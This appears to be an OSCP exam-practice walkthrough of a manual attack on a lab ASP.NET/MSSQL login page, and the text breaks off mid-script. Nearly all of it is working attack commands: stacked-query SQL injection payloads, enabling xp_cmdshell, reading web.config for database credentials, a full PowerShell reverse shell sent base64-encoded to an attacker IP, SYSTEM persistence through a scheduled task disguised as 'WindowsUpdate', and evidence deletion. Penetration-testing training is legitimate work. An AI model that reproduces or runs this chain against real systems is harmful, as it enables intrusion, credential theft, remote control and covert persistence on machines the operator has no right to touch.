# MANUAL ATTACK CHAIN - OFFSECATK.COM
## Step-by-Step Commands Without Automated Tools

**Target:** http://offsecatk.com (192.168.145.50)
**Objective:** Manual exploitation from discovery to shell
**Tools:** curl, netcat, text editor only

---

## PHASE 1: INITIAL RECONNAISSANCE

### 1. Identify the application technology

**COMMAND:**
```bash
curl -I http://offsecatk.com/login.aspx
```

**PROGRESSION:**
- **Starting Point:** URL only (http://offsecatk.com/login.aspx)
- **What Changed:** Added `-I` flag to curl
- **Why:** `-I` fetches HTTP headers only (faster than full page)
- **What We Learn:** Server technology, framework version, headers

**Look for:**
- `Server: Microsoft-IIS/10.0`
- `X-AspNet-Version: 4.0.30319`
- `X-Powered-By: ASP.NET`

**Conclusion:** ASP.NET application, likely MSSQL backend

---

### 2. Capture a legitimate POST request

**COMMAND:**
```bash
curl -s http://offsecatk.com/login.aspx | grep -E 'VIEWSTATE|EVENTVALIDATION' | head -5
```

**PROGRESSION:**
- **Previous:** Headers only
- **What Changed:** Full GET request + grep to extract ASP.NET tokens
- **Why:** ASP.NET requires ViewState tokens in ALL POST requests
- **New Capability:** Can now craft valid POST requests

**Extract these values:**
- `__VIEWSTATE`
- `__VIEWSTATEGENERATOR`
- `__EVENTVALIDATION`

**Save for reuse in all future requests**

---

## PHASE 2: SQL INJECTION DISCOVERY

### 3. Test for SQL injection with single quote

**COMMAND:**
```bash
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D" \
  -d "__VIEWSTATEGENERATOR=C2EE9ABB" \
  -d "__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox='" \
  -d "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  -d "ctl00\$ContentPlaceHolder1\$LoginButton=Login" \
  -s | grep -i "sql\|error\|exception"
```

**PROGRESSION:**
- **Previous:** GET request only
- **What Changed:**
  - Now using POST method (`-X POST`)
  - Added ViewState parameters (from step 2)
  - **Injected single quote (`'`) in username field**
  - Piped output through grep for error detection
- **Why:** Single quote breaks SQL syntax, revealing injection point
- **New Capability:** SQL injection confirmed if we see SQL errors

**Look for:** SQL error message mentioning `System.Data.SqlClient`
**Conclusion:** SQL injection confirmed

---

### 4. Confirm MSSQL with time-based injection

**COMMAND:**
```bash
time curl -X POST "http://offsecatk.com/login.aspx" \
  -d "__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D" \
  -d "__VIEWSTATEGENERATOR=C2EE9ABB" \
  -d "__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=test'; WAITFOR DELAY '00:00:05'--" \
  -d "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  -d "ctl00\$ContentPlaceHolder1\$LoginButton=Login" \
  -s -o /dev/null
```

**PROGRESSION:**
- **Previous:** `'` (single quote to break SQL)
- **What Changed:**
  - **Username now:** `test'; WAITFOR DELAY '00:00:05'--`
  - Added `time` command before curl (measures execution time)
  - Added `-o /dev/null` (discard output, only measure time)
- **Key Components:**
  - `test'` - closes the original string
  - `;` - ends first SQL statement (enables stacked query)
  - `WAITFOR DELAY '00:00:05'` - **MSSQL-specific** 5-second delay
  - `--` - comments out rest of original query
- **Why:** WAITFOR DELAY only works in MSSQL (fingerprinting)
- **New Capability:** Database type confirmed (MSSQL)

**Look for:** Response takes ~5 seconds
**Conclusion:** MSSQL confirmed (WAITFOR DELAY is MSSQL-specific)

---

### 5. Test for stacked queries

**COMMAND:**
```bash
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D" \
  -d "__VIEWSTATEGENERATOR=C2EE9ABB" \
  -d "__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=test'; SELECT 1; WAITFOR DELAY '00:00:03'--" \
  -d "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  -d "ctl00\$ContentPlaceHolder1\$LoginButton=Login" \
  -s -o /dev/null -w "Time: %{time_total}s\n"
```

**PROGRESSION:**
- **Previous:** `test'; WAITFOR DELAY '00:00:05'--` (single stacked query)
- **What Changed:**
  - **Username now:** `test'; SELECT 1; WAITFOR DELAY '00:00:03'--`
  - **Added:** `SELECT 1;` between the semicolons
  - Reduced delay to 3 seconds (faster testing)
  - Added `-w "Time: %{time_total}s\n"` (shows exact timing)
- **Key Components:**
  - `test'` - close original string
  - `;` - end statement #1
  - `SELECT 1` - **arbitrary SQL command**
  - `;` - end statement #2
  - `WAITFOR DELAY '00:00:03'` - statement #3 (timing proof)
  - `--` - comment out rest
- **Why:** Tests if we can run MULTIPLE arbitrary SQL commands
- **New Capability:** Arbitrary SQL execution confirmed (critical for RCE)

**Look for:** 3-second delay + no error
**Conclusion:** Stacked queries enabled (critical for RCE)

---

## PHASE 3: ENABLE COMMAND EXECUTION

### 6. Enable xp_cmdshell (all in one payload)

**COMMAND:**
```bash
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI5DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D" \
  -d "__VIEWSTATEGENERATOR=C2EE9ABB" \
  -d "__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--" \
  -d "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  -d "ctl00\$ContentPlaceHolder1\$LoginButton=Login" \
  -s -o /dev/null
```

**PROGRESSION:**
- **Previous:** `test'; SELECT 1; WAITFOR DELAY '00:00:03'--` (testing)
- **What Changed:**
  - **Username now:** `admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--`
  - Removed testing commands (SELECT, WAITFOR)
  - **Added 4 configuration commands in sequence**
- **Command Breakdown:**
  1. `EXEC sp_configure 'show advanced options', 1` - Unlock advanced settings
  2. `RECONFIGURE` - Apply change #1
  3. `EXEC sp_configure 'xp_cmdshell', 1` - Enable command execution
  4. `RECONFIGURE` - Apply change #2
- **Why:** xp_cmdshell is disabled by default, must enable it
- **New Capability:** Operating system command execution now possible

**Look for:** HTTP 200 response
**Conclusion:** xp_cmdshell now enabled

---

### 7. Verify command execution with whoami

**COMMAND:**
```bash
# Execute command
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D" \
  -d "__VIEWSTATEGENERATOR=C2EE9ABB" \
  -d "__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC master..xp_cmdshell 'whoami > C:\\inetpub\\wwwroot\\out.txt';--" \
  -d "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  -d "ctl00\$ContentPlaceHolder1\$LoginButton=Login" \
  -s -o /dev/null

# Retrieve output
curl -s "http://offsecatk.com/out.txt"
```

**PROGRESSION:**
- **Previous:** Configuration commands (sp_configure, RECONFIGURE)
- **What Changed:**
  - **Username now:** `admin'; EXEC master..xp_cmdshell 'whoami > C:\\inetpub\\wwwroot\\out.txt';--`
  - Replaced sp_configure with **actual OS command**
  - **Added second curl command** to retrieve output
- **Command Breakdown:**
  - `EXEC master..xp_cmdshell` - Call command execution procedure
  - `'whoami > C:\\inetpub\\wwwroot\\out.txt'` - OS command with output redirection
  - `whoami` - displays current user
  - `>` - redirect output to file
  - `C:\\inetpub\\wwwroot\\out.txt` - web-accessible location
- **Why:** Need to write output to retrievable location (can't see inline)
- **New Capability:** Execute commands + exfiltrate results via HTTP

**Expected output:** `nt service\mssql$sqlexpress`
**Conclusion:** Command execution achieved as SQL service account

---

## PHASE 4: SYSTEM ENUMERATION

### 8. Get system information

**COMMAND:**
```bash
# Execute systeminfo
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D" \
  -d "__VIEWSTATEGENERATOR=C2EE9ABB" \
  -d "__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC master..xp_cmdshell 'systeminfo > C:\\inetpub\\wwwroot\\sysinfo.txt';--" \
  -d "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  -d "ctl00\$ContentPlaceHolder1\$LoginButton=Login" \
  -s -o /dev/null

# Wait for command completion
sleep 2

# Retrieve output
curl -s "http://offsecatk.com/sysinfo.txt"
```

**PROGRESSION:**
- **Previous:** `whoami > C:\\inetpub\\wwwroot\\out.txt`
- **What Changed:**
  - **OS command:** `whoami` → `systeminfo`
  - **Output file:** `out.txt` → `sysinfo.txt` (descriptive naming)
  - **Added:** `sleep 2` before retrieval (systeminfo takes longer)
- **Why:** systeminfo provides comprehensive system details
- **New Info Available:**
  - Hostname
  - OS version and build
  - Architecture (x86/x64)
  - Network configuration
  - Installed patches

**Extract:**
- Hostname
- OS version
- Architecture
- IP address

---

### 9. Enumerate user accounts

**COMMAND:**
```bash
# Execute net user
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D" \
  -d "__VIEWSTATEGENERATOR=C2EE9ABB" \
  -d "__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC master..xp_cmdshell 'net user > C:\\inetpub\\wwwroot\\users.txt';--" \
  -d "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  -d "ctl00\$ContentPlaceHolder1\$LoginButton=Login" \
  -s -o /dev/null

# Retrieve output
curl -s "http://offsecatk.com/users.txt"
```

**PROGRESSION:**
- **Previous:** `systeminfo > C:\\inetpub\\wwwroot\\sysinfo.txt`
- **What Changed:**
  - **OS command:** `systeminfo` → `net user`
  - **Output file:** `sysinfo.txt` → `users.txt`
  - **Removed:** sleep command (net user is fast)
- **Pattern Established:** `[COMMAND] > C:\\inetpub\\wwwroot\\[OUTPUT].txt`
- **Why:** Enumerate local user accounts for privilege escalation targets
- **New Info Available:**
  - Local user account names
  - Potential targets for credential attacks

**Note user accounts:** Administrator, Guest, etc.

---

## PHASE 5: CREDENTIAL HARVESTING

### 10. Extract web.config (contains database credentials)

**COMMAND:**
```bash
# Copy web.config to readable location
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D" \
  -d "__VIEWSTATEGENERATOR=C2EE9ABB" \
  -d "__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC master..xp_cmdshell 'type C:\\inetpub\\wwwroot\\web.config > C:\\inetpub\\wwwroot\\webconfig.txt';--" \
  -d "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  -d "ctl00\$ContentPlaceHolder1\$LoginButton=Login" \
  -s -o /dev/null

# Retrieve and parse for credentials
curl -s "http://offsecatk.com/webconfig.txt" | grep -A5 connectionString
```

**PROGRESSION:**
- **Previous:** `net user > C:\\inetpub\\wwwroot\\users.txt` (simple command)
- **What Changed:**
  - **OS command:** `net user` → `type C:\\inetpub\\wwwroot\\web.config`
  - **Command type:** Execute program → Read file
  - **Retrieval:** Added `| grep -A5 connectionString` to filter output
- **Why:**
  - ASP.NET apps store DB credentials in web.config
  - `type` reads file contents (like `cat` in Linux)
  - grep filters XML to show only connection string section
- **New Capability:** File system read access + credential extraction

**Extract:**
- Username: `sa`
- Password: `WhileChirpTuesday218`
- Server: `localhost\SQLEXPRESS`
- Database: `webapp`

---

## PHASE 6: FLAG EXTRACTION

### 11. Search for flag file

**COMMAND:**
```bash
# Recursive search for flag files
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D" \
  -d "__VIEWSTATEGENERATOR=C2EE9ABB" \
  -d "__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC master..xp_cmdshell 'dir C:\\ /s /b | findstr /i \"flag proof local\" > C:\\inetpub\\wwwroot\\search.txt';--" \
  -d "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  -d "ctl00\$ContentPlaceHolder1\$LoginButton=Login" \
  -s -o /dev/null

# Wait for recursive search
sleep 3

# View results
curl -s "http://offsecatk.com/search.txt" | grep "flag.txt"
```

**PROGRESSION:**
- **Previous:** `type C:\\inetpub\\wwwroot\\web.config` (read single known file)
- **What Changed:**
  - **OS command:** `type [file]` → `dir C:\\ /s /b | findstr /i "flag proof local"`
  - **Complexity:** Single file read → Recursive search + filter + pipeline
  - **Wait time:** Increased to 3 seconds (recursive search is slow)
  - **Retrieval filter:** Added `| grep "flag.txt"` on retrieval
- **Command Breakdown:**
  - `dir C:\\ /s /b` - Recursive directory listing
    - `/s` = search subdirectories
    - `/b` = bare format (paths only)
  - `|` = pipe to next command
  - `findstr /i "flag proof local"` - Filter for keywords
    - `/i` = case insensitive
  - `> C:\\inetpub\\wwwroot\\search.txt` - save results
- **Why:** Don't know flag location, must search entire drive
- **New Capability:** File system searching + pattern matching

**Flag location:** `C:\inetpub\wwwroot\flag.txt`

---

### 12. Extract flag contents

**COMMAND:**
```bash
# Read flag file
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D" \
  -d "__VIEWSTATEGENERATOR=C2EE9ABB" \
  -d "__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC master..xp_cmdshell 'type C:\\inetpub\\wwwroot\\flag.txt > C:\\inetpub\\wwwroot\\flag_out.txt';--" \
  -d "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  -d "ctl00\$ContentPlaceHolder1\$LoginButton=Login" \
  -s -o /dev/null

# Retrieve flag
curl -s "http://offsecatk.com/flag_out.txt"
```

**PROGRESSION:**
- **Previous:** `dir C:\\ /s /b | findstr /i "flag proof local"` (search)
- **What Changed:**
  - **OS command:** Back to `type` (read specific file)
  - **File path:** Now using discovered path from step 11
  - **Purpose:** Search → Extract actual flag content
- **Why:** Found location in step 11, now read the actual flag
- **Pattern:** Search (step 11) → Read found file (step 12)

**FLAG:** `OS{a69ff8bdaaf5e6886b8abe89638375c8}`

---

## PHASE 7: REVERSE SHELL

### 13. Get your VPN IP address

**COMMAND:**
```bash
ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1
```

**PROGRESSION:**
- **Previous:** Executing commands on target
- **What Changed:** Now running local command on attacker machine
- **Why:** Need our IP for reverse shell connection
- **New Focus:** Preparing for interactive shell (not one-off commands)

**Your IP:** (e.g., 192.168.45.179)

---

### 14. Start netcat listener

**COMMAND:**
```bash
# In a new terminal window
nc -nlvp 4444
```

**PROGRESSION:**
- **Previous:** Extracted attacker IP
- **What Changed:** Starting listener service on attacker machine
- **Why:** Reverse shell needs something to connect back to
- **Listener stays running** (don't close this terminal)
- **Flags:**
  - `-n` = no DNS lookup (faster)
  - `-l` = listen mode
  - `-v` = verbose (see connection details)
  - `-p 4444` = listen on port 4444

**Leave this running**

---

### 15. Generate PowerShell reverse shell payload

**COMMAND:**
```bash
cat > shell.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient("192.168.45.179",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()
EOF
```

**PROGRESSION:**
- **Previous:** Simple one-line commands (`whoami`, `systeminfo`)
- **What Changed:**
  - Created multi-line PowerShell script
  - Establishes TCP connection back to attacker
  - Creates interactive command loop
- **Why:** xp_cmdshell can execute PowerShell scripts
- **Script does:**
  - Connects to attacker IP:4444
  - Reads commands from attacker
  - Executes them with `iex` (Invoke-Expression)
  - Sends output back
  - Loops forever (interactive session)

**Replace** `192.168.45.179` with your actual VPN IP

---

### 16. Encode payload to Base64 (UTF-16LE)

**COMMAND:**
```bash
# Convert to UTF-16LE and base64 encode
cat shell.ps1 | iconv -t UTF-16LE | base64 -w 0 > shell_b64.txt

# View the base64 payload
cat shell_b64.txt
```

**PROGRESSION:**
- **Previous:** PowerShell script in plain text
- **What Changed:**
  - Converted to UTF-16LE encoding (PowerShell requirement)
  - Base64 encoded the binary data
  - Saved to file for easy copy-paste
- **Why:**
  - PowerShell `-EncodedCommand` requires UTF-16LE
  - Base64 avoids special character escaping issues
  - Command line has character limits, encoding compresses
- **Command breakdown:**
  - `iconv -t UTF-16LE` = convert text encoding
  - `base64 -w 0` = encode to base64, no line wrapping
  - `> shell_b64.txt` = save encoded payload

**Copy the entire base64 string**

---

### 17. Execute reverse shell via SQL injection

**COMMAND:**
```bash
# Execute PowerShell with base64 payload
# Replace [BASE64_PAYLOAD] with output from step 16
curl -X POST "http://offsecatk.com/login.aspx" \
  --data-urlencode "__VIEWSTATE=/wEPDwUKMjA3MTgxMTM4N2Rkqwqg/oL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4=" \
  --data-urlencode "__VIEWSTATEGENERATOR=C2EE9ABB" \
  --data-urlencode "__EVENTVALIDATION=/wEdAAS/uzRgA9bOZgZWuL94SJbKG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ+fPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH+M50=" \
  --data-urlencode "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC master..xp_cmdshell 'powershell -e [BASE64_PAYLOAD]';--" \
  --data-urlencode "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  --data-urlencode "ctl00\$ContentPlaceHolder1\$LoginButton=Login" \
  -s -o /dev/null
```

**PROGRESSION:**
- **Previous:** Simple commands (`whoami`, `systeminfo`) with output redirection
- **What Changed:**
  - **OS command:** `systeminfo` → `powershell -e [BASE64]`
  - **curl flag:** `-d` → `--data-urlencode` (handles special chars)
  - **No output file** (shell connects directly to listener)
  - **Command doesn't return** (maintains connection)
- **Command breakdown:**
  - `powershell -e [BASE64]` = Execute encoded PowerShell command
  - `-e` = EncodedCommand (reads UTF-16LE base64)
- **Why:** Previous commands were one-time execution, this creates persistent connection
- **Expected behavior:** Command appears to hang (PowerShell maintains connection)

---

### 18. Check netcat listener for connection

**PROGRESSION:**
- **Previous:** Sent reverse shell command to target
- **What Changed:** Now checking attacker machine for incoming connection
- **Why:** PowerShell script from step 15 should connect back now

**In your netcat terminal, you should see:**
```
listening on [any] 4444 ...
connect to [192.168.45.179] from (UNKNOWN) [192.168.145.50] [random_port]
PS C:\Windows\system32>
```

**Test the shell:**
```powershell
whoami
hostname
ipconfig
```

**PROGRESSION COMPLETE:**
- **Started:** HTTP GET request to fingerprint app
- **Now have:** Interactive PowerShell session on target
- **Evolution:** Read-only recon → Command execution → Full interactive shell

---

## PHASE 8: POST-EXPLOITATION (OPTIONAL)

### 19. Check current privileges

**COMMAND:**
```powershell
whoami /priv
```

**PROGRESSION:**
- **Previous:** Basic commands in reverse shell
- **What Changed:** Now using `/priv` flag for detailed privilege info
- **Why:** Determine if we can escalate to SYSTEM
- **Shows:** Current user privileges and elevation possibilities

---

### 20. Search for additional credentials

**COMMAND:**
```powershell
# Search for sensitive files
dir C:\ /s /b | findstr /i "password credential unattend"

# Check for stored credentials
cmdkey /list

# View PowerShell history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**PROGRESSION:**
- **Previous:** Single enumeration command
- **What Changed:** Multiple targeted searches for different credential types
- **Why:** More credentials = more access options
- **Searches:**
  - Files with "password" in name
  - Windows Credential Manager
  - PowerShell command history (may contain passwords)

---

### 21. Establish persistence (if needed)

**COMMAND:**
```powershell
# Create scheduled task (example)
schtasks /create /tn "WindowsUpdate" /tr "powershell -e [BASE64_PAYLOAD]" /sc onlogon /ru SYSTEM
```

**PROGRESSION:**
- **Previous:** One-time reverse shell
- **What Changed:** Creating automatic reconnection mechanism
- **Why:** Current shell dies if connection lost
- **Persistence method:** Scheduled task runs on user logon
- **Task name:** "WindowsUpdate" (blends in with legitimate tasks)
- **Runs as:** SYSTEM (highest privilege)

---

## CLEANUP (IMPORTANT)

### 22. Remove evidence of testing

**COMMAND:**
```bash
# Delete created files via SQL injection
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D" \
  -d "__VIEWSTATEGENERATOR=C2EE9ABB" \
  -d "__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC xp_cmdshell 'del C:\\inetpub\\wwwroot\\out.txt C:\\inetpub\\wwwroot\\sysinfo.txt C:\\inetpub\\wwwroot\\users.txt C:\\inetpub\\wwwroot\\webconfig.txt C:\\inetpub\\wwwroot\\search.txt C:\\inetpub\\wwwroot\\flag_out.txt';--" \
  -d "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  -d "ctl00\$ContentPlaceHolder1\$LoginButton=Login" \
  -s -o /dev/null
```

**PROGRESSION:**
- **Previous:** Creating files on target (`out.txt`, `sysinfo.txt`, etc.)
- **What Changed:**
  - **OS command:** Changed to `del` (delete files)
  - **Multiple files:** All artifacts from steps 7-12 listed
- **Why:** Remove evidence of penetration testing
- **Professional practice:** Always clean up after engagement
- **Files removed:**
  - out.txt (whoami output)
  - sysinfo.txt (system info)
  - users.txt (user accounts)
  - webconfig.txt (config file copy)
  - search.txt (file search results)
  - flag_out.txt (flag contents)

---

## ATTACK PROGRESSION SUMMARY

**Evolution of Username Parameter:**

```
Step 3:  '                                           (break SQL)
Step 4:  test'; WAITFOR DELAY '00:00:05'--           (confirm MSSQL)
Step 5:  test'; SELECT 1; WAITFOR DELAY '00:00:03'-- (test stacked queries)
Step 6:  admin'; EXEC sp_configure [...]; RECONFIGURE [...];-- (enable xp_cmdshell)
Step 7:  admin'; EXEC xp_cmdshell 'whoami > [...]';-- (execute OS command)
Step 8:  admin'; EXEC xp_cmdshell 'systeminfo > [...]';-- (enumerate system)
Step 9:  admin'; EXEC xp_cmdshell 'net user > [...]';-- (enumerate users)
Step 10: admin'; EXEC xp_cmdshell 'type web.config > [...]';-- (steal credentials)
Step 11: admin'; EXEC xp_cmdshell 'dir /s | findstr flag > [...]';-- (find flag)
Step 12: admin'; EXEC xp_cmdshell 'type flag.txt > [...]';-- (extract flag)
Step 17: admin'; EXEC xp_cmdshell 'powershell -e [BASE64]';-- (reverse shell)
Step 22: admin'; EXEC xp_cmdshell 'del [files]';-- (cleanup)
```

**Capability Evolution:**

```
Steps 1-2:   Information gathering (passive)
            ↓
Steps 3-5:   Vulnerability confirmation (active probing)
            ↓
Step 6:      Configuration exploitation (enable RCE)
            ↓
Steps 7-12:  Command execution (blind, output via HTTP)
            ↓
Steps 13-18: Interactive access (reverse shell)
            ↓
Steps 19-21: Privilege escalation & persistence
            ↓
Step 22:     Operational security (cleanup)
```

**Key Transitions:**

1. **GET → POST** (Step 3): From reconnaissance to exploitation
2. **Error messages → Time delays** (Step 4): Fingerprinting database
3. **Single command → Stacked queries** (Step 5): Critical escalation point
4. **SQL commands → OS commands** (Step 7): Breaking out of database
5. **Blind execution → Interactive shell** (Step 17): Full system access

---

## COMPLETE ATTACK SUMMARY

**Total Steps:** 22 commands
**Time Required:** ~25-30 minutes
**Tools Used:** curl, netcat, base64, iconv, text editor

**Attack Path:**
1. Reconnaissance (steps 1-2)
2. SQL injection discovery (steps 3-5)
3. Enable command execution (steps 6-7)
4. System enumeration (steps 8-9)
5. Credential harvesting (step 10)
6. Flag extraction (steps 11-12)
7. Reverse shell (steps 13-18)
8. Post-exploitation (steps 19-21)
9. Cleanup (step 22)

---

## CRITICAL SUCCESS FACTORS

**For this attack to work:**
- ✅ SQL injection exists in login form
- ✅ Stacked queries are allowed
- ✅ Application connects as sysadmin (sa)
- ✅ xp_cmdshell can be enabled
- ✅ Web root is writable
- ✅ Outbound connections allowed
- ✅ PowerShell execution permitted

**If any factor fails, see alternative methods in vulnerability_research.md**

---

## EXAM TIPS

**For OSCP exam:**
1. **Practice this sequence until memorized**
2. **Have base64 PowerShell payload pre-generated**
3. **Create bash script for common POST requests**
4. **Document every command in real-time**
5. **Screenshot flag retrieval and shell access**
6. **Time yourself - aim for <20 minutes**

**Common mistakes to avoid:**
- Forgetting to include ViewState parameters
- Not waiting for long-running commands (use sleep)
- Incorrect escaping of special characters
- Using wrong encoding for PowerShell (must be UTF-16LE)
- Not testing command execution before trying reverse shell

---

## BASH SCRIPT HELPER

**Create this script to speed up exploitation:**

```bash
#!/bin/bash
# Save as sqli_exec.sh

TARGET="http://offsecatk.com/login.aspx"
VS="%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D"
VSG="C2EE9ABB"
